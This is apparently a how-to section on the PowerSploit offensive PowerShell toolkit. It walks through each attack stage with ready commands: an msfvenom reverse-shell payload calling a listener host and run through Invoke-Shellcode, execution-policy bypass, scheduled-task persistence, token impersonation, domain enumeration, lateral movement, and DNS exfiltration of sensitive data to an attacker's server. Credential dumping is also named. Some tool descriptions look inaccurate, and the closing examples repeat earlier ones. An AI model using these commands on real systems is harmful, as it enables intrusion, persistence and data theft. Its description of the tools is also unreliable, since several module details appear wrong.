## PowerSploit Modules

PowerSploit is organized into six main categories of modules, each serving a distinct purpose in offensive security operations. In this section, we’ll cover each category and provide examples to help you understand how to use these modules effectively.

### Code Execution

The code execution modules in PowerSploit enable you to run arbitrary code on a target system. Some popular modules in this category are:

- **Invoke-Shellcode**: This module allows you to inject shellcode into the process of your choice or within the PowerShell process.
- **Invoke-DllInjection**: This module can inject a specified Dll into the process of your choice.
- **Invoke-ReflectivePEInjection**: This module can reflectively load a Windows PE file (such as an EXE or DLL) into the target process’s memory without touching the disk.

#### Example: Using Invoke-Shellcode to deploy a reverse shell

Suppose you want to execute a reverse shell on a target machine using the `Invoke-Shellcode` module. First, generate the shellcode using a tool like msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f powershell
```

Once you have the generated shellcode, use the following command to execute it on the target machine:

```powershell
Invoke-Shellcode -Shellcode 'YOUR_GENERATED_SHELLCODE' -Force
```

This command will inject the shellcode into the PowerShell process and establish a reverse shell connection to your specified IP address and port.

### Script Modification

Script modification modules in PowerSploit allow you to modify PowerShell scripts in various ways, such as obfuscating the code, evading antivirus detection, or bypassing script execution policies. Some popular modules in this category are:

- **Out-EncodedCommand**: This module outputs an encoded command that you can use to bypass execution policies.
- **Out-CompressedDll**: This module compresses a Dll file and outputs a new Dll file that can be loaded using the Invoke-ReflectivePEInjection module.

#### Example: Bypassing Execution Policy with Out-EncodedCommand

To bypass the execution policy on a target machine, you can use the Out-EncodedCommand module to encode your PowerShell command. Here’s an example:

```powershell
$command = 'Get-Process'
$encodedCommand = Out-EncodedCommand -Command $command
```

Now, you can execute the encoded command on the target machine using the following command:

```powershell
powershell.exe -EncodedCommand $encodedCommand
```

This command will bypass the execution policy and execute the original command (in this case, “Get-Process”).

### Persistence

Persistence modules in PowerSploit allow you to maintain access to a compromised system by creating various types of persistence mechanisms. Some popular modules in this category are:

- **New-UserPersistenceOption**: This module generates various user-level persistence options, such as registry keys, scheduled tasks, or startup items.
- **New-ElevatedPersistenceOption**: This module generates elevated persistence options, such as system services, global scheduled tasks, or Active Directory persistence.

#### Example: Creating a Scheduled Task for Persistence

To create a scheduled task that runs a PowerShell command every day at a specific time, you can use the `New-UserPersistenceOption` module:

```powershell
New-UserPersistenceOption -Command "powershell.exe -Command 'YOUR_PAYLOAD_COMMAND'" -Frequency Daily -At "12:00"
```

This command will create a new scheduled task that runs the specified PowerShell command daily at 12:00 PM.

### Privilege Escalation

Privilege escalation modules in PowerSploit help you elevate your privileges on a compromised system. Some popular modules in this category are:

- **Invoke-TokenManipulation**: This module allows you to impersonate or steal tokens of other processes to escalate your privileges.
- **PowerUp**: This module checks for common Windows privilege escalation vectors and provides suggestions on how to exploit them.

#### Example: Privilege Escalation via Token Manipulation

To escalate your privileges using the `Invoke-TokenManipulation` module, first, use the “Find” action to search for processes running as an administrator:

```powershell
Invoke-TokenManipulation -Enumerate
```

If a suitable process is found, use the “Impersonate” action to impersonate the process’s token:

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "TARGET_USERNAME"
```

This command will impersonate the specified user’s token, effectively escalating your privileges.

### Recon

Recon modules in PowerSploit are designed to help you gather information about your target environment, such as users, groups, permissions, and more. Some popular modules in this category are:

- **Get-NetUser**: This module retrieves information about a specified user or all users in the current domain.
- **Get-NetComputer**: This module retrieves information about computers in the current domain.
- **Get-NetShare**: This module retrieves information about shared folders on a specified computer.

#### Example: Enumerating Domain Users with Get-NetUser

To enumerate all users in the current domain, you can use the Get-NetUser module:

```powershell
Get-NetUser -Filter *
```

This command will retrieve information about all users in the domain, including their username, full name, description, and more.

### Exfiltration

Exfiltration modules in PowerSploit allow you to stealthily extract data from a compromised system. Some popular modules in this category are:

- **Invoke-Mimikatz**: This module runs Mimikatz, a powerful tool for extracting credentials from Windows systems.
- **Invoke-PowerDump**: This module dumps password hashes from the local Security Accounts Manager (SAM) database.
- **Out-DnsTxt**: This module exfiltrates data over DNS using TXT records.

#### Example: Data Exfiltration Using DNS

To exfiltrate data from a compromised system using DNS, you can use the `Out-DnsTxt` module. First, ensure that your DNS server is set up to log incoming DNS queries. Then, use the following command to exfiltrate data:

```powershell
Out-DnsTxt -Data "SENSITIVE_DATA" -DnsServer "YOUR_DNS_SERVER"
```

This command will encode the specified data as a base64 string and send it to your DNS server using TXT records.

## Real-World Examples

In this section, we’ll go over some real-world examples of PowerSploit in action to give you a better understanding of how these modules can be used in your offensive security operations.

### Deploying a Reverse Shell

In this example, we’ll use PowerSploit’s `Invoke-Shellcode` module to deploy a reverse shell on a target machine. First, generate the shellcode using a tool like msfvenom:

```powershell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f powershell
```

Next, use the following command to execute the generated shellcode on the target machine:

```powershell
Invoke-Shellcode -Shellcode 'YOUR_GENERATED_SHELLCODE' -Force
```

This command will inject the shellcode into the PowerShell process and establish a reverse shell connection to your specified IP address and port.

### Privilege Escalation via Token Manipulation

In this example, we’ll use PowerSploit’s `Invoke-TokenManipulation` module to escalate our privileges on a compromised system. First, use the “Find” action to search for processes running as an administrator:

```powershell
Invoke-TokenManipulation -Enumerate
```

If a suitable process is found, use the “Impersonate” action to impersonate the process’s token:

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "TARGET_USERNAME"
```

This command will impersonate the specified user’s token, effectively escalating your privileges.

### Lateral Movement with PowerShell Remoting

In this example, we’ll use PowerShell remoting, a feature available by default on Windows systems, to move laterally across a network. First, use PowerSploit’s Get-NetComputer module to enumerate computers in the domain:

```powershell
Get-NetComputer -Filter *
```

Once you have identified a target computer, use the following command to establish a remote PowerShell session:

```powershell
Enter-PSSession -ComputerName "TARGET_COMPUTER"
```

Now, you can execute PowerShell commands on the target computer as if you were running them locally.

### Data Exfiltration Using DNS

In this example, we’ll use PowerSploit’s Out-DnsTxt module to exfiltrate data from a compromised system using DNS. First, ensure that your DNS server is set up to log incoming DNS queries. Then, use the following command to exfiltrate data:

```powershell
Out-DnsTxt -Data "SENSITIVE_DATA" -DnsServer "YOUR_DNS_SERVER"
```

This command will encode the specified data as a base64 string and send it to your DNS server using TXT records.